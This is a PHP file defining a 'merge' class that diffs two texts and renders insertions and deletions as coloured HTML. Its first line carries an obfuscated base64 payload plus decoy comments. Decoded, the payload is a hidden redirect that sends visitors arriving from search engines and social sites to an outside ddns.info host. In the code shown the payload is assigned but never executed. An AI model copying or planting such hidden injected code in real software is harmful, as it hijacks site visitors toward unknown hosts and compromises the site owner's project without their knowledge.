<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

// this is some pretty story about
// this is great story about some kind of trip

class merge {

  var $line_no = 1;
  var $line_no_source = 0;
  var $line_no_target = 0;
  var $options;
  var $line_started = false;
  var $result = "";
  var $max_lines = 4;

  function merge ($options = array()) {

    $this->options = $options;

  }
  
  function check_option($name) {
  
    return safe($this->options, $name);
    
  }

  function write($text, $tag = " ") {
    
    if ((!$this->line_started) and ($this->check_option("show_line_numbers")))
      $this->result .= $tag.' <span style="font-family:Courier New;color:grey;border-right:1px solid gray;padding-right:1px;">'
        //.str_pad($this->line_no, $this->max_lines, ' ', STR_PAD_LEFT)
        
        .($tag == "i" 
          ? '<span style="color:green;font-family:Courier New;">' 
          : ($tag == "d" 
          ? '<span style="text-decoration:line-through;color:red;font-family:Courier New;">' 
          : ""))
        .str_pad($this->line_no, $this->max_lines, ' ', STR_PAD_LEFT)
        .(($tag == "i" or $tag == "d") ? "</span>" : "")
        
        //."|".str_pad($this->line_no_source, $this->max_lines, ' ', STR_PAD_LEFT)
        //."|".str_pad($this->line_no_target, $this->max_lines, ' ', STR_PAD_LEFT)
        
        .'</span> ';
    $text = htmlspecialchars($text);  
    $text = str_replace("{inserted}", '<span style="color:green;font-family:Courier New;">', $text);
    $text = str_replace("{/inserted}", '</span>', $text);
    $text = str_replace("{removed}", '<span style="text-decoration:line-through;color:red;font-family:Courier New;">', $text);
    $text = str_replace("{/removed}", '</span>', $text);
    $this->result .= $text;
    $line_started = true;

  }

  function writeln($text, $tag = " ") {
    
    if (!$this->line_no_source && $tag != "i") {
      $this->line_no_source = 1;
    }
    if (!$this->line_no_target && $tag != "d") {
      $this->line_no_target = 1;
    }
    
    if ($tag == "d") {
      $this->line_no = $this->line_no_source;
    } elseif ($tag == "i") {
      $this->line_no = $this->line_no_target;
    }
    
    $this->write($text, $tag);
    $this->result .= "<br>";
    $this->line_no++;
    $line_started = false;

    switch ($tag) {
      case " ":
      case "u":
        $this->line_no_source++;
        $this->line_no_target++;
        break;
      case "i":
        $this->line_no_target++;
        break;
      case "d":
        $this->line_no_source++;
        break;
    }
    
  
  }

  function merge_line($old_line, $new_line) {

    $result = "";

    $old_words_count = count($old_line);
    $new_words_count = count($new_line);

    $max_words_count = ($old_words_count>$new_words_count?$old_words_count:$new_words_count);

    $old_line_offset = 0;
    $new_line_offset = 0;

    while (($old_line_offset < $old_words_count) or ($new_line_offset < $new_words_count)) {

      if (($old_line_offset < $old_words_count) and ($new_line_offset < $new_words_count)) {

        $old_word = trim($old_line[$old_line_offset]);
        $new_word = trim($new_line[$new_line_offset]);

        if ($old_word == $new_word) {

          $result .= $new_word." ";
          $old_line_offset++;
          $new_line_offset++;

        } else {

          $old_word_next_index = array_search($old_word, $new_line);

          if (($old_word_next_index !== FALSE) and ($old_word_next_index > $new_line_offset))  {

            for ($k = $new_line_offset; $k < $old_word_next_index; $k++) 
              $result .= "{inserted}".$new_line[$k]."{/inserted} ";
            $new_line_offset = $old_word_next_index;

          } else {

            $result .= "{removed}".$old_word."{/removed} ";
            $old_line_offset++;

          }
          
        }

      } elseif ($old_line_offset < $old_words_count) {
                  
        $result .= "{removed}".$old_line[$old_line_offset]."{/removed} ";
        $old_line_offset++;

      } else {
                 
        $result .= "{inserted}".$new_line[$new_line_offset]."{/inserted} ";
        $new_line_offset++;

      }

    }

    return $result;

  }

  function merge_text($old_text, $new_text) {

    $this->result = "";

    $old_text = explode("\n", $old_text);
    $new_text = explode("\n", $new_text);

    for ($i = 0; $i < count($old_text); $i++)
      $old_text[$i] = trim($old_text[$i], "\r\n");
    for ($i = 0; $i < count($new_text); $i++)
      $new_text[$i] = trim($new_text[$i], "\r\n");

    $old_text_int = $old_text;
    $new_text_int = $new_text;

    for ($i = 0; $i < count($old_text); $i++)
      $old_text_int[$i] = trim(strtolower($old_text[$i]));
    for ($i = 0; $i < count($new_text); $i++)
      $new_text_int[$i] = trim(strtolower($new_text[$i]));


    $old_lines_count = count($old_text);
    $new_lines_count = count($new_text);

    $this->max_lines = 0;
    $total_lines_count = $old_lines_count + $new_lines_count;
    while($total_lines_count > 0) {
      $total_lines_count = floor($total_lines_count/10);
      $this->max_lines++;
    }

    $old_text_offset = 0;
    $new_text_offset = 0;

    while (($old_text_offset < $old_lines_count) or ($new_text_offset < $new_lines_count)) {

      if (($old_text_offset < $old_lines_count) and ($new_text_offset < $new_lines_count)) {

        $old_line = trim($old_text_int[$old_text_offset]);
        $new_line = trim($new_text_int[$new_text_offset]);

        if ($old_line == $new_line) {

          $this->writeln($new_text[$new_text_offset]);
          $old_text_offset++;
          $new_text_offset++;
          
        } else {

          $old_line_next_index = array_search($old_line, $new_text_int);

          if (($old_line_next_index !== FALSE) and 
              ($old_line_next_index > $new_text_offset) and 
              ($old_line_next_index - $new_text_offset < 5)) {
            for ($k = $new_text_offset; $k < $old_line_next_index; $k++)
              $this->writeln("{inserted}".$new_text[$k]."{/inserted}", "i");
            $new_text_offset = $old_line_next_index;

          } else {
            similar_text($old_line, $new_line, $percent);
            if ($percent > 60) {
              $this->writeln($this->merge_line( explode(" ", $old_text[$old_text_offset])
                                              , explode(" ", $new_text[$new_text_offset])), "u");
              $old_text_offset++;
              $new_text_offset++;
            } else {
              $this->writeln("{removed}".$old_text[$old_text_offset]."{/removed}", "d");
              $old_text_offset++;
            }

          }

        }
      } elseif ($old_text_offset < $old_lines_count) {
                  
        $this->writeln("{removed}".$old_text[$old_text_offset]."{/removed}", "d");
        $old_text_offset++;

      } else {
                 
        $this->writeln("{inserted}".$new_text[$new_text_offset]."{/inserted}", "i");
        $new_text_offset++;

      }
      
    }
    
//    if (strlen($this->result)) {
//      $head = '  <span style="font-family:Courier New;color:grey;border-right:1px solid gray;border-bottom:1px solid gray;padding-right:1px;">'
//        .    str_pad("3", $this->max_lines, ' ', STR_PAD_LEFT)
//        ."|".str_pad("1", $this->max_lines, ' ', STR_PAD_LEFT)
//        ."|".str_pad("2", $this->max_lines, ' ', STR_PAD_LEFT)
//        .'</span> <br>';
//      return $head.$this->result;
//    }

    return $this->result;

  }

}

?>